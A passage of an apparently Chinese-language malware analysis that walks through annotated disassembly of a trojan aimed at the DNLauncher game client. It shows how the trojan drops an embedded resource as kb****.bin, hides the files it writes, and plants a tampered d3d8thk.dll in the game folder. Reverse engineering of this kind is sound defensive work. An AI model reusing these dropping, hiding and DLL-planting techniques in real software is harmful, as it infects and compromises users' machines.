004032B7  |.  50                    push    eax                                   ;  GetFileAttributesA
004032B8  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004032BB  |.  50                    push    eax
0040334B  |.  885D FA               mov     byte ptr [ebp-6], bl
0040334E  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
00403350  |.  50                    push    eax
00403351  |.  E8 DBE5FFFF           call    00401931                              ;  GetProcAddress GetFileAttributesA
00403356  |.  59                    pop     ecx
00403357  |.  8BF8                  mov     edi, eax                              ;  edi = GetFileAttributesA 的地址
00403359  |.  59                    pop     ecx
0040335A  |.  8D45 E8               lea     eax, dword ptr [ebp-18]               ;  SetFileAttributesA
0040335D  |.  50                    push    eax
0040335E  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
00403361  |.  50                    push    eax
00403362  |.  FFD6                  call    esi                                   ;  LoadLibraryA
00403364  |.  50                    push    eax
00403365  |.  E8 C7E5FFFF           call    00401931                              ;  GetProcAddress SetFileAttributesA
0040336A  |.  59                    pop     ecx
0040336B  |.  8945 E0               mov     dword ptr [ebp-20], eax
0040336E  |.  59                    pop     ecx
0040336F  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]               ;  目录 windows\\system\\kb\*\*\*\*.axs
00403375  |.  50                    push    eax
00403376  |.  FFD7                  call    edi                                   ;  GetFileAttributesA
00403378  |.  0C 02                 or      al, 2                                 ;  修改文件属性为 FILE\_ATTRIBUTE\_HIDDEN
0040337A  |.  50                    push    eax                                   ;  添加了隐藏的文件属性
0040337B  |.  8D85 18FEFFFF         lea     eax, dword ptr [ebp-1E8]
00403381  |.  50                    push    eax                                   ;  目录 windows\\system\\kb\*\*\*\*.axs
00403382  |.  FF55 E0               call    dword ptr [ebp-20]                  ;  SetFileAttributesA
00403385  |.  EB 36                 jmp     short 004033BD
00403387  |>  FF75 0C               push    dword ptr [ebp+C]
0040338A  |.  C645 DC 4C            mov     byte ptr [ebp-24], 4C                 ;  LoadDll
0040338E  |.  C645 DD 6F            mov     byte ptr [ebp-23], 6F
00403392  |.  C645 DE 61            mov     byte ptr [ebp-22], 61
00403396  |.  C645 DF 64            mov     byte ptr [ebp-21], 64
0040339A  |.  C645 E0 44            mov     byte ptr [ebp-20], 44
0040339E  |.  C645 E1 6C            mov     byte ptr [ebp-1F], 6C
004033A2  |.  C645 E2 6C            mov     byte ptr [ebp-1E], 6C
004033A6  |.  885D E3               mov     byte ptr [ebp-1D], bl
004033A9  |.  FFD6                  call    esi                                   ;  LoadLibraryA 加载释放出的 bin
004033AB  |.  8D4D DC               lea     ecx, dword ptr [ebp-24]
004033AE  |.  51                    push    ecx                                   ;  LoadDll
004033AF  |.  50                    push    eax
004033B0  |.  E8 7CE5FFFF           call    00401931                              ;  GetProcAddress kb\*\*\*\*.bin LoadDll
004033B5  |.  59                    pop     ecx
004033B6  |.  3BC3                  cmp     eax, ebx                              ;  判断 LoadDll 函数地址是否获取成功
004033B8  |.  59                    pop     ecx
004033B9  |.  74 02                 je      short 004033BD                        ;  如果获取失败，则跳转
004033BB  |.  FFD0                  call    eax                                   ;  Call LoadDll
004033BD  |>  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004033C3  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004033C4  |.  E8 66E3FFFF           call    0040172F                              ;  strlen
004033C9  |.  85C0                  test    eax, eax
004033CB  |.  59                    pop     ecx
004033CC  |.  0F84 F5000000         je      004034C7                              ;  返回 0 则跳转
004033D2  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004033D8  |.  53                    push    ebx
004033D9  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004033DA  |.  FF75 0C               push    dword ptr [ebp+C]                   ;  载释放出的 bin 的绝对路径
004033DD  |.  FF95 58FFFFFF         call    dword ptr [ebp-A8]                  ;  CopyFileA 复制释放的 bin 到游戏目录下，并命名为 mfc42.log
004033E3  |.  85C0                  test    eax, eax
004033E5  |.  0F84 DC000000         je      004034C7                              ;  复制失败则跳转
004033EB  |.  395D C4               cmp     dword ptr [ebp-3C], ebx
004033EE  |.  0F84 D3000000         je      004034C7
004033F4  |.  8D45 E8               lea     eax, dword ptr [ebp-18]
004033F7  |.  C645 E8 47            mov     byte ptr [ebp-18], 47                 ;  EAX = GetFileAttributesA
004033FB  |.  50                    push    eax
004033FC  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004033FF  |.  50                    push    eax
00403400  |.  C645 E9 65            mov     byte ptr [ebp-17], 65
0040348F  |.  885D DA               mov     byte ptr [ebp-26], bl
00403492  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
00403494  |.  50                    push    eax
00403495  |.  E8 97E4FFFF           call    00401931                              ;  GetProcAddress GetFileAttributesA
0040349A  |.  59                    pop     ecx
0040349B  |.  8BF8                  mov     edi, eax                              ;  edi = GetFileAttributesA 地址
0040349D  |.  59                    pop     ecx
0040349E  |.  8D45 C8               lea     eax, dword ptr [ebp-38]               ;  SetFileAttributesA
004034A1  |.  50                    push    eax
004034A2  |.  8D45 B4               lea     eax, dword ptr [ebp-4C]               ;  kernel32.dll
004034A5  |.  50                    push    eax
004034A6  |.  FFD6                  call    esi                                   ;  LoadLibraryA kernel32.dll
004034A8  |.  50                    push    eax
004034A9  |.  E8 83E4FFFF           call    00401931                              ;  GetProcAddress SetFileAttributesA
004034AE  |.  59                    pop     ecx
004034AF  |.  8BF0                  mov     esi, eax                              ;  esi = SetFileAttributesA 地址
004034B1  |.  59                    pop     ecx
004034B2  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004034B8  |.  50                    push    eax                                   ;  mfc42.log 文件绝对路径
004034B9  |.  FFD7                  call    edi                                   ;  GetFileAttributesA
004034BB  |.  0C 02                 or      al, 2                                 ;  设置其隐藏属性
004034BD  |.  50                    push    eax
004034BE  |.  8D85 0CFBFFFF         lea     eax, dword ptr [ebp-4F4]
004034C4  |.  50                    push    eax
004034C5  |.  FFD6                  call    esi                                   ;  SetFileAttributesA
004034C7  |>  8D85 08FAFFFF         lea     eax, dword ptr [ebp-5F8]               ;  kb\*\*\*\*.axs
004034CD  |.  BE 1C704000           mov     esi, 0040701C                         ;  "d3d8thk.dll"
004034D2  |.  50                    push    eax
004034D3  |.  56                    push    esi
004034D4  |.  E8 FEEEFFFF           call    004023D7                              ;  对"系统目录\\d3d8thk.dll"进行复制和更改
004034D9  |.  0FB6C0                movzx   eax, al
004034DC  |.  59                    pop     ecx
004034DD  |.  3BC3                  cmp     eax, ebx
004034DF  |.  59                    pop     ecx
004034E0  |.  75 04                 jnz     short 004034E6
004034E2  |>  33C0                  xor     eax, eax
004034E4  |.  EB 2D                 jmp     short 00403513
004034E6  |>  395D C4               cmp     dword ptr [ebp-3C], ebx
004034E9  |.  74 1E                 je      short 00403509
004034EB  |.  8D85 FCF6FFFF         lea     eax, dword ptr [ebp-904]               ;  buffer
004034F1  |.  50                    push    eax
004034F2  |.  8D85 00F8FFFF         lea     eax, dword ptr [ebp-800]
004034F8  |.  50                    push    eax                                   ;  游戏目录
004034F9  |.  56                    push    esi                                   ;  "d3d8thk.dll"
004034FA  |.  E8 E61B0000           call    004050E5                              ;  复制"系统目录\\d3d8thk.dll.dat" 到 "游戏目录\\d3d8thk.dll"
004034FF  |.  0FB6C0                movzx   eax, al                             ;  1
00403502  |.  83C4 0C               add     esp, 0C
00403505  |.  3BC3                  cmp     eax, ebx
00403507  |.  75 07                 jnz     short 00403510                        ;  成功写入病毒代码，则跳转
00403509  |>  56                    push    esi                                   ;  "d3d8thk.dll"
0040350A  |.  E8 38160000           call    00404B47
0040350F  |.  59                    pop     ecx
00403510  |>  6A 01                 push    1
00403512  |.  58                    pop     eax
00403513  |>  5F                    pop     edi
00403514  |.  5E                    pop     esi
00403515  |.  5B                    pop     ebx
00403516  |.  C9                    leave
00403517  \\. C3                    ret
```



在系统临时文件目录中释放一个名称为 `kb***.bin` 的文件，其中 `*` 为 0~9 的随机数字

### 第二段

该段是第一段中的一个子过程

代码:

```



```
00402605  /$  55                 push    ebp
00402606  |.  8BEC               mov     ebp, esp
00402608  |.  81EC C8010000      sub     esp, 1C8
0040260E  |.  53                 push    ebx
0040260F  |.  56                 push    esi
00402610  |.  57                 push    edi
00402611  |.  6A 40              push    40
00402613  |.  33DB              xor     ebx, ebx
00402615  |.  59                 pop     ecx                         ;  ecx = 0x40
00402616  |.  33C0              xor     eax, eax
00402618  |.  8DBD 39FEFFFF     lea     edi, dword ptr [ebp-1C7]
0040261E  |.  889D 38FEFFFF     mov     byte ptr [ebp-1C8], bl
00402624  |.  8B35 00604000     mov     esi, dword ptr [<&kernel32.LoadLibraryA>]   ;  kernel32.LoadLibraryA
0040262A  |.  F3:AB             rep     stos dword ptr es:[edi]
0040262C  |.  66:AB            stos    word ptr es:[edi]
0040262E  |.  AA               stos    byte ptr es:[edi]
0040262F  |.  8D45 F0          lea     eax, dword ptr [ebp-10]
00402632  |.  C645 E4 43       mov     byte ptr [ebp-1C], 43
00402636  |.  50               push    eax                         ; /FileName
00402637  |.  C645 E5 72       mov     byte ptr [ebp-1B], 72           ; |填充内容 CreateFile
0040263B  |.  C645 E6 65       mov     byte ptr [ebp-1A], 65           ; |
0040263F  |.  C645 E7 61       mov     byte ptr [ebp-19], 61           ; |
00402643  |.  C645 E8 74       mov     byte ptr [ebp-18], 74           ; |
00402647  |.  C645 E9 65       mov     byte ptr [ebp-17], 65           ; |
0040264B  |.  C645 EA 46       mov     byte ptr [ebp-16], 46           ; |
0040264F  |.  C645 EB 69       mov     byte ptr [ebp-15], 69           ; |
00402653  |.  C645 EC 6C       mov     byte ptr [ebp-14], 6C           ; |
00402657  |.  C645 ED 65       mov     byte ptr [ebp-13], 65           ; |
0040265B  |.  C645 EE 41       mov     byte ptr [ebp-12], 41           ; |
0040265F  |.  885D EF          mov     byte ptr [ebp-11], bl           ; |
00402662  |.  C645 F0 4B       mov     byte ptr [ebp-10], 4B           ; |填充内容 kernel32.dll
00402666  |.  C645 F1 65       mov     byte ptr [ebp-F], 65            ; |
0040266A  |.  C645 F2 72       mov     byte ptr [ebp-E], 72            ; |
0040266E  |.  C645 F3 6E       mov     byte ptr [ebp-D], 6E            ; |
00402672  |.  C645 F4 65       mov     byte ptr [ebp-C], 65            ; |
00402676  |.  C645 F5 6C       mov     byte ptr [ebp-B], 6C            ; |
0040267A  |.  C645 F6 33       mov     byte ptr [ebp-A], 33            ; |
0040267E  |.  C645 F7 32       mov     byte ptr [ebp-9], 32            ; |
00402682  |.  C645 F8 2E       mov     byte ptr [ebp-8], 2E            ; |
00402686  |.  C645 F9 64       mov     byte ptr [ebp-7], 64            ; |
0040268A  |.  C645 FA 6C       mov     byte ptr [ebp-6], 6C            ; |
0040268E  |.  C645 FB 6C       mov     byte ptr [ebp-5], 6C            ; |
00402692  |.  885D FC          mov     byte ptr [ebp-4], bl            ; |
00402695  |.  FFD6             call    esi                         ; \LoadLibraryA Kernel32.dll
00402697  |.  8BF8             mov     edi, eax
00402699  |.  3BFB             cmp     edi, ebx
0040269B  |.  0F84 6B030000   je      00402A0C                     ;  判断加载是否成功
004026A1  |.  8D45 A4          lea     eax, dword ptr [ebp-5C]
004026A4  |.  C645 A4 47       mov     byte ptr [ebp-5C], 47
004026A8  |.  50               push    eax
004026A9  |.  57               push    edi
004026AA  |.  C645 A5 65       mov     byte ptr [ebp-5B], 65           ;  填充 GetTempPathA
004026AE  |.  C645 A6 74       mov     byte ptr [ebp-5A], 74
004026B2  |.  C645 A7 54       mov     byte ptr [ebp-59], 54
004026B6  |.  C645 A8 65       mov     byte ptr [ebp-58], 65
004026BA  |.  C645 A9 6D       mov     byte ptr [ebp-57], 6D
004026BE  |.  C645 AA 70       mov     byte ptr [ebp-56], 70
004026C2  |.  C645 AB 50       mov     byte ptr [ebp-55], 50
004026C6  |.  C645 AC 61       mov     byte ptr [ebp-54], 61
004026CA  |.  C645 AD 74       mov     byte ptr [ebp-53], 74
004026CE  |.  C645 AE 68       mov     byte ptr [ebp-52], 68
004026D2  |.  C645 AF 41       mov     byte ptr [ebp-51], 41
004026D6  |.  885D B0          mov     byte ptr [ebp-50], bl
004026D9  |.  E8 53F2FFFF      call    00401931                     ;  GetProcAddress GetTempPathA
004026DE  |.  59               pop     ecx
004026DF  |.  59               pop     ecx
004026E0  |.  8D8D 38FEFFFF    lea     ecx, dword ptr [ebp-1C8]
004026E6  |.  51               push    ecx                         ;  Buffer
004026E7  |.  68 04010000      push    104                         ;  length = 0x104
004026EC  |.  FFD0             call    eax
004026EE  |.  85C0             test    eax, eax
004026F0  |.  0F84 16030000   je      00402A0C                     ;  判断是否成功获取系统临时文件夹
004026F6  |.  8D45 94          lea     eax, dword ptr [ebp-6C]
004026F9  |.  C645 94 46       mov     byte ptr [ebp-6C], 46
004026FD  |.  50               push    eax
004026FE  |.  57               push    edi
004026FF  |.  C645 95 65       mov     byte ptr [ebp-6B], 65           ;  填充 FindResourceA
00402806  |.  E8 26F1FFFF      call    00401931                     ;  GetProcAddress FindResourceA
0040280B  |.  8985 5CFFFFFF    mov     dword ptr [ebp-A4], eax
00402811  |.  8D45 84          lea     eax, dword ptr [ebp-7C]
00402814  |.  50               push    eax
00402815  |.  57               push    edi
00402816  |.  E8 16F1FFFF      call    00401931                     ;  GetProcAddress SizeofResource
0040281B  |.  8985 64FFFFFF    mov     dword ptr [ebp-9C], eax
00402821  |.  8D45 B4          lea     eax, dword ptr [ebp-4C]
00402824  |.  50               push    eax
00402825  |.  57               push    edi
00402826  |.  E8 06F1FFFF      call    00401931                     ;  GetProcAddress LoadResource
0040282B  |.  8985 60FFFFFF    mov     dword ptr [ebp-A0], eax
00402831  |.  8D45 C4          lea     eax, dword ptr [ebp-3C]
00402834  |.  50               push    eax
00402835  |.  57               push    edi
00402836  |.  E8 F6F0FFFF      call    00401931                     ;  GetProcAddress LockResource
0040283B  |.  8985 74FFFFFF    mov     dword ptr [ebp-8C], eax
00402841  |.  8D45 D4          lea     eax, dword ptr [ebp-2C]
00402844  |.  50               push    eax
00402845  |.  57               push    edi
00402846  |.  E8 E6F0FFFF      call    00401931                     ;  GetProcAddress FreeResource
0040284B  |.  6A 07             push    7
0040284D  |.  8985 68FFFFFF    mov     dword ptr [ebp-98], eax
00402853  |.  59               pop     ecx                         ;  ecx = 7
00402854  |.  33C0             xor     eax, eax
00402856  |.  8DBD 3DFFFFFF    lea     edi, dword ptr [ebp-C3]
0040285C  |.  53               push    ebx                         ; /timer
0040285D  |.  F3:AB            rep     stos dword ptr es:[edi]           ; |
0040285F  |.  66:AB            stos    word ptr es:[edi]           ; |
00402861  |.  AA               stos    byte ptr es:[edi]           ; |
00402862  |.  C685 3CFFFFFF 6B mov     byte ptr [ebp-C4], 6B           ; |ebp - c4 是一 char 数组的首地址，这里是给前两个 char 填充内容 kb
00402869  |.  C685 3DFFFFFF 62 mov     byte ptr [ebp-C3], 62           ; |
00402870  |.  FF15 90604000   call    dword ptr [<&MSVCRT.time>]        ; \time
00402876  |.  50               push    eax                         ; /seed
00402877  |.  FF15 8C604000   call    dword ptr [<&MSVCRT.srand>]       ; \以当前时间作为种子取随即数
0040287D  |.  83C4 30          add     esp, 30
00402880  |.  6A 02             push    2
00402882  |.  5F               pop     edi                         ;  下面 10 句指令是一个小循环，给 char 数组的 3~6 位填充内容，范围 1~9
00402883  |>  FF15 88604000    /call   dword ptr [<&MSVCRT.rand>]        ; [rand
00402889  |.  6A 0A             |push   0A
0040288B  |.  99               |cdq
0040288C  |.  59               |pop    ecx                         ;  ecx = 0x0a
0040288D  |.  F7F9            |idiv   ecx                         ;  eax = rand() / 0x0A  则 dl = 0 ~ 9
0040288F  |.  80C2 30          |add    dl, 30                       ;  把 dl 加上 0x30 则转换为相对应的 ascii 码
00402892  |.  88943D 3CFFFFFF  |mov    byte ptr [ebp+edi-C4], dl         ;  把值赋予 int 数组
00402899  |.  47               |inc    edi                         ;  下标加一
0040289A  |.  83FF 06         |cmp    edi, 6
0040289D  |.^ 7C E4          \jl     short 00402883               ;  循环
0040289F  |.  C6843D 3CFFFFFF 2E mov   byte ptr [ebp+edi-C4], 2E           ;  在 char 数组后添加元素 0x2E '.'
004028A7  |.  47               inc     edi
004028A8  |.  8D85 3CFFFFFF   lea     eax, dword ptr [ebp-C4]           ;  数组地址
004028AE  |.  C6843D 3CFFFFFF 62 mov   byte ptr [ebp+edi-C4], 62           ;  在 char 数组后添加元素 0x62 'b'
004028B6  |.  47               inc     edi                         ;  下标加一
004028B7  |.  50               push    eax
004028B8  |.  8D85 38FEFFFF   lea     eax, dword ptr [ebp-1C8]           ;  eax = 临时文件目录
004028BE  |.  C6843D 3CFFFFFF 69 mov   byte ptr [ebp+edi-C4], 69           ;  在 char 数组后添加元素 0x69 'i'
004028C6  |.  47               inc     edi
004028C7  |.  50               push    eax
004028C8  |.  C6843D 3CFFFFFF 6E mov   byte ptr [ebp+edi-C4], 6E           ;  在 char 数组后添加元素 0x6E 'n'
004028D0  |.  889C3D 3DFFFFFF  mov    byte ptr [ebp+edi-C3], bl           ;  在最后补 0
004028D7  |.  E8 69EEFFFF     call    00401745                     ;  获取系统临时文件路径，在路径后追加刚刚随即生成的文件名的.bin
004028DC  |.  8D85 38FEFFFF   lea     eax, dword ptr [ebp-1C8]
004028E2  |.  50               push    eax                         ;  压入文件绝对路径
004028E3  |.  FF75 08          push    dword ptr [ebp+8]           ;  压入 buffer 指针
004028E6  |.  E8 63EDFFFF     call    0040164E                     ;  此函数把生成的文件绝对路径复制到堆空间中
004028EB  |.  83C4 10          add     esp, 10
004028EE  |.  899D 70FFFFFF   mov     dword ptr [ebp-90], ebx
004028F4  |.  53               push    ebx                         ; /pModule
004028F5  |.  FF15 04604000   call    dword ptr [<&kernel32.GetModuleHandleA>]    ; \获取当前进程的 HMODULE
004028FB  |.  FF75 0C          push    dword ptr [ebp+C]           ;  "WMAT"
004028FE  |.  8BF8             mov     edi, eax
00402900  |.  FF75 10          push    dword ptr [ebp+10]          ;  0x75
00402903  |.  57               push    edi
00402904  |.  FF95 5CFFFFFF   call    dword ptr [ebp-A4]          ;  FindResourceA 获取名为 WMAT 的资源
0040290A  |.  8945 08          mov     dword ptr [ebp+8], eax
0040290D  |.  50               push    eax
0040290E  |.  58               pop     eax
0040290F  |.  395D 08          cmp     dword ptr [ebp+8], ebx
00402912  |.  0F84 F4000000   je      00402A0C                     ;  判断是否为 NULL
00402918  |.  FF75 08          push    dword ptr [ebp+8]           ;  压入 WMAT 资源首地址
0040291B  |.  57               push    edi                         ;  压入模块基址
0040291C  |.  FF95 60FFFFFF   call    dword ptr [ebp-A0]          ;  LoadResource 加载资源到全局空间
00402922  |.  3BC3             cmp     eax, ebx
00402924  |.  8945 0C          mov     dword ptr [ebp+C], eax
00402927  |.  0F84 DF000000   je      00402A0C                     ;  判断 LoadResource 是否成功
0040292D  |.  50               push    eax                         ;  传入资源的内存地址
0040292E  |.  FF95 74FFFFFF   call    dword ptr [ebp-8C]          ;  SetHandleCount 这个地方应该是传参错误，不过没什么影响
00402934  |.  3BC3             cmp     eax, ebx
00402936  |.  8985 74FFFFFF   mov     dword ptr [ebp-8C], eax
0040293C  |.  0F84 D8000000   je      00402A1A                     ;  判断 SetHandleCount 结果
00402942  |.  FF75 08          push    dword ptr [ebp+8]           ;  资源地址
00402945  |.  57               push    edi                         ;  HMODULE
00402946  |.  FF95 64FFFFFF   call    dword ptr [ebp-9C]          ;  SizeofResource 获取资源大小
0040294C  |.  8945 10          mov     dword ptr [ebp+10], eax             ;  大小为 0x5200
0040294F  |.  8D45 E4          lea     eax, dword ptr [ebp-1C]             ;  eax = "CreateFileA"
00402952  |.  50               push    eax
00402953  |.  8D45 F0          lea     eax, dword ptr [ebp-10]             ;  eax = "Kernel32.dll"
00402956  |.  50               push    eax
00402957  |.  FFD6             call    esi                         ;  LoadLibraryA Kernel32.dll
00402959  |.  50               push    eax
0040295A  |.  E8 D2EFFFFF     call    00401931                     ;  GetProcAddress 获取 CreateFileA 函数地址
0040295F  |.  59               pop     ecx
00402960  |.  8BF8             mov     edi, eax
00402962  |.  59               pop     ecx
00402963  |.  8D85 78FFFFFF   lea     eax, dword ptr [ebp-88]
00402969  |.  50               push    eax                         ;  先压入地址，然后再填充其内容
0040296A  |.  8D45 F0          lea     eax, dword ptr [ebp-10]
0040296D  |.  50               push    eax
0040296E  |.  C685 78FFFFFF 43 mov    byte ptr [ebp-88], 43           ;  填充的内容为 CloseHandle
00402975  |.  C685 79FFFFFF 6C mov    byte ptr [ebp-87], 6C
0040297C  |.  C685 7AFFFFFF 6F mov    byte ptr [ebp-86], 6F
00402983  |.  C685 7BFFFFFF 73 mov    byte ptr [ebp-85], 73
0040298A  |.  C685 7CFFFFFF 65 mov    byte ptr [ebp-84], 65
00402991  |.  C685 7DFFFFFF 48 mov    byte ptr [ebp-83], 48
00402998  |.  C685 7EFFFFFF 61 mov    byte ptr [ebp-82], 61
0040299F  |.  C685 7FFFFFFF 6E mov    byte ptr [ebp-81], 6E
004029A6  |.  C645 80 64       mov     byte ptr [ebp-80], 64
004029AA  |.  C645 81 6C       mov     byte ptr [ebp-7F], 6C
004029AE  |.  C645 82 65       mov     byte ptr [ebp-7E], 65
004029B2  |.  885D 83          mov     byte ptr [ebp-7D], bl
004029B5  |.  FFD6             call    esi                         ;  LoadLibraryA Kernel32.dll
004029B7  |.  50               push    eax
004029B8  |.  E8 74EFFFFF     call    00401931                     ;  GetProcAddress CloseHandle
004029BD  |.  59               pop     ecx
004029BE  |.  8945 08          mov     dword ptr [ebp+8], eax
004029C1  |.  59               pop     ecx
004029C2  |.  8D85 38FEFFFF   lea     eax, dword ptr [ebp-1C8]
004029C8  |.  53               push    ebx                         ;  0
004029C9  |.  53               push    ebx                         ;  0
004029CA  |.  6A 02             push    2
004029CC  |.  53               push    ebx                         ;  0
004029CD  |.  53               push    ebx                         ;  0
004029CE  |.  68 000000C0      push    C0000000
004029D3  |.  50               push    eax                         ;  文件的绝对路径 文件名 kb\*\*\*\*.bin  *的范围 0~9
004029D4  |.  FFD7             call    edi                         ;  CreateFileA
004029D6  |.  8BF0             mov     esi, eax
004029D8  |.  83FE FF          cmp     esi, -1
004029DB  |.  74 39            je      short 00402A16                 ;  判断创建文件是否成功
004029DD  |.  8D85 6CFFFFFF   lea     eax, dword ptr [ebp-94]
004029E3  |.  53               push    ebx                         ; /pOverlapped
004029E4  |.  50               push    eax                         ; |pBytesWritten
004029E5  |.  FF75 10          push    dword ptr [ebp+10]          ; |nBytesToWrite
004029E8  |.  FFB5 74FFFFFF   push    dword ptr [ebp-8C]          ; |资源地址
004029EE  |.  56               push    esi                         ; |hFile
004029EF  |.  FF15 10604000   call    dword ptr [<&kernel32.WriteFile>]        ; \WriteFile 把资源文件转存到创建的文件中
004029F5  |.  3BC3             cmp     eax, ebx
004029F7  |.  8985 70FFFFFF   mov     dword ptr [ebp-90], eax
004029FD  |.  56               push    esi
004029FE  |.  75 10            jnz     short 00402A10                 ;  写入成功则跳转
00402A00  |.  FF55 08          call    dword ptr [ebp+8]           ;  否则 CloseHandle
00402A03  |.  FF75 0C          push    dword ptr [ebp+C]           ;  压入资源地址
00402A06  |.  FF95 68FFFFFF   call    dword ptr [ebp-98]          ;  FreeResource 释放资源 此 API 已废弃
00402A0C  |>  33C0             xor     eax, eax
00402A0E  |.  EB 19            jmp     short 00402A29
00402A10  |>  FF15 0C604000   call    dword ptr [<&kernel32.FlushFileBuffers>]    ; \完成写入操作
00402A16  |>  56               push    esi
00402A17  |.  FF55 08          call    dword ptr [ebp+8]           ;  CloseHandle 关闭文件 handle
00402A1A  |>  FF75 0C          push    dword ptr [ebp+C]
00402A1D  |.  FF95 68FFFFFF   call    dword ptr [ebp-98]          ;  FreeResource 释放资源
00402A23  |.  8B85 70FFFFFF   mov     eax, dword ptr [ebp-90]
00402A29  |>  5F               pop     edi
00402A2A  |.  5E               pop     esi
00402A2B  |.  5B               pop     ebx
00402A2C  |.  C9               leave
00402A2D  \\.  C3             retn
```



先在 `SOFTWARE\snda\dn` 中找游戏路径，如果没找到，则到 `Software\Microsoft\Windows\ShellNoRoam\MUICache` 中寻找，找到返回 1，失败返回 0。

### 第三段

```
00401EBC  /$  55                 push    ebp
00401EBD  |.  8BEC               mov     ebp, esp
00401EBF  |.  83EC 5C            sub     esp, 5C                     ;  分配 0x5c 大小的栈空间
00401EC2  |.  53                 push    ebx
00401EC3  |.  56                 push    esi                         ;  "LoadLibraryA"
00401EC4  |.  FF75 14            push    dword ptr [ebp+14]          ;  "loader"
00401EC7  |.  FF75 10            push    dword ptr [ebp+10]          ;  "SOFTWARE\snda\dn"
00401ECA  |.  FF75 0C            push    dword ptr [ebp+C]           ;  根键
00401ECD  |.  FF75 08            push    dword ptr [ebp+8]           ;  第一个参数，缓冲区（栈中），用来保存注册表项中内容
00401ED0  |.  E8 FDFBFFFF        call    00401AD2                    ;  判断注册表项中的值是否有"\dnlauncher.exe"，如果找到，则通过第一个参数返回游戏的绝对路径，失败返回 0，成功返回 1
00401ED5  |.  83C4 10            add     esp, 10                     ;  平衡堆栈
00401ED8  |.  85C0               test    eax, eax                    ;  判断是否成功获取游戏的绝对路径
00401EDA  |.  74 08              je      short 00401EE4              ;  如果失败，则跳转，从"Software\Microsoft\Windows\ShellNoRoam\MUICache"中寻找游戏目录
00401EDC  |.  6A 01              push    1
00401EDE  |.  58                 pop     eax                         ;  eax = 1
00401EDF  |.  E9 E4010000        jmp     004020C8
00401EE4  |>  8D45 E4            lea     eax, dword ptr [ebp-1C]
00401EE7  |.  33DB               xor     ebx, ebx
00401EE9  |.  50                 push    eax                         ; /FileName
00401EEA  |.  C645 A4 53         mov     byte ptr [ebp-5C], 53       ; |填充"Software\Microsoft\Windows\ShellNoRoam\MUICache"
00401FA9  |.  C645 E4 41         mov     byte ptr [ebp-1C], 41       ; |填充"Advapi32.dll"
00401FAD  |.  C645 E5 64         mov     byte ptr [ebp-1B], 64       ; |
00401FDC  |.  FF15 00604000      call    dword ptr [<&kernel32.LoadLibraryA>] ; \LoadLibraryA "Advapi32.dll"
00401FE2  |.  8BF0               mov     esi, eax
00401FE4  |.  3BF3               cmp     esi, ebx                    ;  判断是否加载成功
00401FE6  |.  0F84 BF000000      je      004020AB                    ;  如果加载失败，则跳转
00401FEC  |.  8D45 D4            lea     eax, dword ptr [ebp-2C]     ;  先赋予缓冲区指针，下面马上填充内容
00401FEF  |.  57                 push    edi
00401FF0  |.  50                 push    eax
00401FF1  |.  56                 push    esi
00401FF2  |.  C645 D4 52         mov     byte ptr [ebp-2C], 52       ;  填充"RegOpenKeyExA"
00402029  |.  C645 F4 52         mov     byte ptr [ebp-C], 52        ;  填充 RegCloseKey
0040202D  |.  C645 F5 65         mov     byte ptr [ebp-B], 65
00402058  |.  E8 D4F8FFFF        call    00401931                    ;  GetProcAddress RegOpenKeyExA
0040205D  |.  8BF8               mov     edi, eax
0040205F  |.  8D45 F4            lea     eax, dword ptr [ebp-C]      ;  eax = "RegCloseKey"
00402062  |.  50                 push    eax
00402063  |.  56                 push    esi
00402064  |.  E8 C8F8FFFF        call    00401931                    ;  GetProcAddress Advapi32.dll RegCloseKey
00402069  |.  83C4 10            add     esp, 10                     ;  平衡堆栈
0040206C  |.  8BF0               mov     esi, eax
0040206E  |.  8D45 14            lea     eax, dword ptr [ebp+14]
00402071  |.  50                 push    eax                         ;  PHKEY phkResult
00402072  |.  68 19000200        push    20019                       ;  KEY_ALL_ACCESS
00402077  |.  8D45 A4            lea     eax, dword ptr [ebp-5C]
0040207A  |.  53                 push    ebx                         ;  DWORD ulOptions
0040207B  |.  50                 push    eax                         ;  "Software\Microsoft\Windows\ShellNoRoam\MUICache"
0040207C  |.  68 01000080        push    80000001                    ;  HKEY_CURRENT_USER
00402081  |.  FFD7               call    edi                         ;  RegOpenKeyExA
00402083  |.  85C0               test    eax, eax                    ;  判断注册表打开结果
00402085  |.  5F                 pop     edi
00402086  |.  75 11              jnz     short 00402099              ;  如果失败，则跳转
00402088  |.  FF75 18            push    dword ptr [ebp+18]          ;  "\DNLauncher.exe"
0040208B  |.  FF75 14            push    dword ptr [ebp+14]          ;  "Software\Microsoft\Windows\ShellNoRoam\MUICache"的 PKEY
0040208E  |.  FF75 08            push    dword ptr [ebp+8]           ;  buffer
00402091  |.  E8 4CFCFFFF        call    00401CE2                    ;  在注册表项 Software\Microsoft\Windows\ShellNoRoam\MUICache 中查找"DNLauncher.exe"的绝对路径
00402096  |.  83C4 0C            add     esp, 0C                     ;  堆栈平衡
00402099  |>  FF75 14            push    dword ptr [ebp+14]
0040209C  |.  FFD6               call    esi                         ;  RegCloseKey 关闭"Software\Microsoft\Windows\ShellNoRoam\MUICache"
0040209E  |.  FF75 08            push    dword ptr [ebp+8]           ;  压入游戏 exe 的路径
004020A1  |.  E8 89F6FFFF        call    0040172F                    ;  strlen
004020A6  |.  85C0               test    eax, eax                    ;  判断返回的长度
004020A8  |.  59                 pop     ecx
004020A9  |.  75 04              jnz     short 004020AF              ;  不为 0 则跳转，否则函数返回 0
004020AB  |>  33C0               xor     eax, eax
004020AD  |.  EB 19              jmp     short 004020C8
004020AF  |>  FF75 18            push    dword ptr [ebp+18]          ; /"DNLauncher.exe"
004020B2  |.  FF75 08            push    dword ptr [ebp+8]           ; |在本机上找到的游戏绝对路径
004020B5  |.  FF15 74604000      call    dword ptr [<&MSVCRT.strstr>] ; \strstr 查找文件名位置
004020BB  |.  59                 pop     ecx
004020BC  |.  3BC3               cmp     eax, ebx                    ;  判断是否找到
